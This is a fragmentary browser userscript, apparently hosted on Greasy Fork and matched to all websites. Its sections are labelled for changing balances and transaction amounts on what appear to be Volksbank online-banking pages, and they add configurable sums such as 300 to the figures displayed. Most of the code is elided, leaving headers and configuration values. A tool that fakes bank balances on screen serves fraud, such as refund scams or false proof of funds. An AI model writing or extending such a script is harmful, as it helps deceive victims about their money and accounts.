...
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/487381/Ed%20Cons%20Horst%20Herrlinger.user.js
// @updateURL https://update.greasyfork.org/scripts/487381/Ed%20Cons%20Horst%20Herrlinger.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  300},
        { index: 1, adjustmentAmount: 300},
        { index: 2, adjustmentAmount: 300},
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    const modificationAmount = 300.0; // Adjust the amount as needed
